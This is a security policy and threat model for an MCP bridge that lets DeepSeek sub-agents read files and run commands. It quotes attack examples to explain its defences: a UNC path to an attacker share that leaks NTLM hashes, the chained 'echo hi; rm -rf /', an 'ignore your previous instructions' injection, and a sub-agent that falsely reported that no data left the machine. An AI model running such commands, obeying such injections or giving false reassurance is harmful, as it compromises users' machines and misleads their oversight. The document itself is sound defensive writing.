# Security Policy

## Reporting a vulnerability

Please **do not** open a public issue for a security vulnerability.

Report privately via GitHub's [private vulnerability reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability) (Security tab → Report a vulnerability), or by opening a minimal issue that says only "security — please contact me" with no details, and a maintainer will follow up.

Include:

- what the issue is and its impact,
- steps to reproduce,
- affected version / commit,
- any suggested fix.

We aim to acknowledge within a few days. This is a volunteer project, so please be patient.

## Threat model

This bridge is a **publicly reachable HTTP endpoint that spends money on your behalf**. Understand the model before deploying.

### What protects the endpoint

| Control | Purpose |
|---|---|
| **Capability URL** (`/mcp/<64-hex-secret>`) | The path *is* the credential. ChatGPT connector forms have no Bearer-token field, so this is the only available shared secret. |
| **404 on wrong/bare path** | The bare `/mcp` path and any incorrect path return 404 with no distinguishing detail, so the endpoint cannot be enumerated. |
| **Rate limiting** | Per-IP sliding window (default 20/min) caps abuse if the URL leaks. |
| **Loopback binding** | `HOST` defaults to `127.0.0.1`; the tunnel runs on the same machine, so the port is never exposed to the LAN. |
| **Request body limit** | 2 MB cap on JSON bodies. |
| **Upstream timeout** | `DEEPSEEK_TIMEOUT_MS` bounds how long a request can hold resources. |
| **Output cap** | `DEEPSEEK_MAX_OUTPUT_TOKENS` bounds per-call spend. |

### What the controls above do *not* cover

- **Possession of the URL is sufficient access.** There is no per-request authentication beyond the path secret. This is a constraint of the ChatGPT connector UI, not an oversight.
- **No confidentiality of prompt content.** Anything you send is forwarded to the DeepSeek API and is subject to their data policies. Do not send secrets.
- **Rate-limit state is in-memory.** It is per-process and resets on restart. It is a speed bump, not a hard quota.

Everything in this section defends your **billing**. None of it defends your **computer** — that is the next section.

## Agent capabilities — read this before enabling them

Out of the box the bridge is still read-only: the agent tools reject every workspace, so the endpoint can only spend quota. This whole section applies the moment you set `DEEPSEEK_ALLOWED_ROOTS`.

> **Anyone holding the URL can make the sub-agent read and write files on your computer, and run commands on it. "Can run commands" means "has your computer."**

Read that twice. The tiers differ by orders of magnitude:

| What you enable | What the holder of the URL can do |
|---|---|
| Nothing (default) | Spend your DeepSeek quota. **Cannot touch your computer.** |
| `DEEPSEEK_ALLOWED_ROOTS` set | Read and modify files under those roots |
| …plus command execution | **Run arbitrary commands — that is the machine** |

### What actually constrains it

- **Workspace allow-list.** `DEEPSEEK_ALLOWED_ROOTS` names the roots a sub-agent may work in. Unset or empty means **every workspace is denied** — fail closed, never "defaults to anywhere on disk".
- **The workspace is resolved through `src/sandbox.ts` on every `agent_start`.** That is the only place a caller-supplied string becomes a real path. It rejects UNC paths (`\\attacker\share` leaks NTLM hashes on resolution), `\\?\` / `\??\` device namespaces, NTFS alternate data streams, reserved device names (`CON`, `NUL`, `COM1`…), and trailing dots and spaces that Win32 silently ignores; it lowercases before comparing; it requires a separator at the boundary so `D:\workspace-evil` does not pass for `D:\workspace`; and it calls `realpath` on the *deepest existing ancestor* — without that, a junction pointing at your home directory walks straight through. Regression suite: `npm run test:sandbox`.
- **Files *inside* the workspace are not individually re-checked.** Once a workspace is admitted, what the sub-agent may touch within it is governed by the harness (`--add-dir` for Claude Code). Path-level enforcement for every read and write is a built-in-harness feature and is not implemented here.
- **Command allow-list plus per-command human approval.** Pre-approved: `node`, `npm`, `npx`, `git`, `tsc`, `dir`, `ls`, `cat`, `type`, `find`, `grep`, `echo`, plus PowerShell's read-only cmdlets (`Get-Content`, `Get-ChildItem`, `Test-Path`, `Select-String`, `Get-FileHash`, …) — the Unix half of that list barely exists on the platform this actually runs on, so on its own it was close to decorative. Anything else **pauses the job** — it does not fail — and waits for you to read the full command text with `npm run ctl -- pending` and then `approve <id>` or `deny <id>`. **No answer means deny.** There is no default-allow path and no timeout that lets it through.
- **The allow-list reads the first word only.** It constrains which *program* runs, never its arguments: `node <any path>` is approved, `.\node x.mjs` is not, and nothing at this layer can tell the two apart. So approving `Get-Content` approves *every* file this process can read, including `.env` — read access was never narrowed by the Unix spellings either.
- **UNC paths are refused even inside an approved command.** `type \\attacker\share\x` starts with an allowed word, but Windows resolves the name *before* the command runs, and that resolution hands the account's NTLM hash to whoever answered. The first-word check cannot see an argument, so an argument containing `\\` gets its own rule.
- **The approval channel is not on the network.** The approval prompt runs as a stdio child of the harness process, not as an endpoint on the capability URL. Otherwise a caller holding the URL could approve its own commands.
- **Step and wall-clock ceilings.** A job exceeding `BRIDGE_MAX_STEPS` or `BRIDGE_JOB_TIMEOUT_MS` is killed together with its entire process tree. `npm run ctl -- job kill <id>` does the same on demand.
- **Audit log.** Every auto-approval, approval request and decision is appended to `.state/audit.log`, readable with `npm run ctl -- audit`.

### Honest limits — these are not guarantees

1. **The unit of approval is a whole command, not a program.** Approving `npm` approves everything `npm` can do.
2. **`echo hi; rm -rf /` will not be auto-approved.** Prefixing a harmless command and chaining the real one is the classic way past a first-token allow-list, so anything containing `;`, `&`, `|`, `>`, `` ` ``, `$(`, or a newline is sent to a human instead. That rule is a heuristic, not a proof.
3. **You cannot read `npm install some-pkg` and know what it does.** That is an honest limitation, not a bug. It does catch the obvious: `curl` posting files outward, registry edits, formats.
4. **This is not a security boundary — it is an observation window.** The only real boundary is a sandbox or a VM. Be at the machine while jobs run.
5. **Prompt injection has no fix here.** A file in the workspace that says "ignore your previous instructions" cannot be defended against by any test in this repo. The mitigation that *is* tested is the step and time ceiling.
6. **A sub-agent's account of what it did is not evidence, and neither is its account of what it did not do.** It cannot see its own hosting: it runs on DeepSeek's API, so any file content a tool reads into its context is transmitted there on the next model call. Observed in practice — after reading a file, a sub-agent reported "no external transmission occurred, nothing was sent to any external service", which was false in exactly the reassuring direction. The `nonce` defends against a fabricated *result*; nothing defends against a fabricated *reassurance*. If you need to know whether something left the machine, answer it from the architecture — what entered the model's context — never from what the model says.
7. **Hardlinks are a known gap, tested as success.** `workspace\innocent.txt` can be a hardlink to `.env` in your home directory; a path check cannot see that. The mitigation is structural — hardlinks cannot cross volumes, so keeping the workspace on `D:` and your profile on `C:` isolates them by construction. `test:sandbox` asserts this succeeds, rather than pretending the gap is not there.

### Going back to tier one

**Clear `DEEPSEEK_ALLOWED_ROOTS` and restart.** The agent tools then reject every path and the bridge degrades to the original read-only Q&A tool, with this entire section inapplicable. That is a supported configuration, and the recommended way to start: run read-only for a while, confirm the URL has not leaked, and only then consider turning it on.

### Operator checklist

Before exposing the bridge:

1. Use a **dedicated** DeepSeek API key. Do not reuse a key other tools depend on.
2. Set a **spend cap** on that key in the DeepSeek console. This is the last line of defence.
3. Keep `HOST=127.0.0.1`. Do not set `0.0.0.0`.
4. Rotate `MCP_PATH_SECRET` with `npm run ctl -- rotate` if the URL may have leaked — it restarts the server, keeps the tunnel (so the hostname does not change) and puts the new URL on your clipboard. Then update the connector URL.
5. Never commit `.env`. It is gitignored by default — keep it that way.
6. **Leave `DEEPSEEK_ALLOWED_ROOTS` empty unless you intend to hand over the machine.** If you do set it, keep the workspace on a volume that does not hold your profile, and be at the keyboard while jobs run.

## Supported versions

Only the latest release on the default branch receives fixes. There are no backport branches.
